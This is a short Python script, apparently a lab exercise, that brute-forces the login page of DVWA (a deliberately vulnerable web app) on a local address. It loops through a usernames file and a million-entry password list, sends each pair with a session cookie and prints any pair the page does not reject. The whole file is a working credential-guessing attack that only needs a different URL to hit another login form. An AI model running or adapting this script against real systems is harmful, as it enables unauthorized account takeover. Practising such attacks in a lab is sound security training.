import requests

cookies = {'PHPSESSID' : '2b19004c498b2da3788e56052d8cfc3e', 'security' : 'high'}

nome_utente = []
passwords = []

with open('usernames.txt','r') as username :
	nome_utente = username.read().splitlines()
		
with open('1000000-password-seclists.txt','r') as password :
	passwords = password.read().splitlines()
		#print("nome_utente", nome_utente)
		#print("password", passwords)
	
	for n in nome_utente:
		for p in passwords:
			
			url = '' 
			url += 'http://192.168.1.64/dvwa/vulnerabilities/brute/?'
			url += 'username=' + n
			url += '&password=' +p
			url += '&Login=Login'
			
			req = requests.get(url, cookies=cookies)
			#print(req.status_code)
			
			#print(req.url)
			
			if (b'incorrect' not in req.content):
				print('username=' + n +', password=' + p)
			